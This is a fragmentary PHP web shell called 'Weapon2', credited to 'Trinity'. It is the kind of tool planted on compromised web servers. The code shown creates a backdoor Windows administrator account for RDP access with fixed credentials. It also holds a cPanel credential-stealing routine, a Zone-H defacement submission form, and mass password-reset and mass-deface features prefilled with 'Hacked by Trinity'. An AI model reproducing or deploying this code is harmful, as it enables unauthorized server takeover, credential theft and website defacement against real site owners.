...
$password = "dd3272e0a1b7fc38c4335b6f7539ff7d"; # 
...
<!--
###############################################################################
// Special Thanks to Me: Hard Work
###############################################################################
-->
<head>
<title>Weapon2</title>
<meta name='author' content='Weapon2'>
<meta charset="UTF-8">
<style type='text/css'>
...
function tools($toolsname, $args = null) {
	...
	elseif($toolsname === "krdp") {
		...
		if(preg_match("/Weapon2/", exe("net user"))) die(color(1, 1, "[INFO] username 'Weapon2' already exists."));

		$add_user   = exe("net user Weapon2 Weapon2 /add");
    	$add_groups1 = exe("net localgroup Administrators Weapon2 /add");
    	$add_groups2 = exe("net localgroup Administrator Weapon2 /add");
    	$add_groups3 = exe("net localgroup Administrateur Weapon2 /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "Weapon2")."<br>
    	Password: ".color(1, 2, "Weapon2")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='' target='_blank'>".color(1, 2, "Trinity")."</a></center>";
}
	...
	if(isset($_GET['do'])) {
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='Weapon2'><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				...
				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by Trinity")."</p>";
			} else {
				print "<center>
		...
		elseif($_GET['do'] == 'mpc') {
			if($_POST['hajar']) {
				...
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='Weapon2' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='Weapon2' placeholder='pass_baru'><br>
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Trinity</textarea><br>
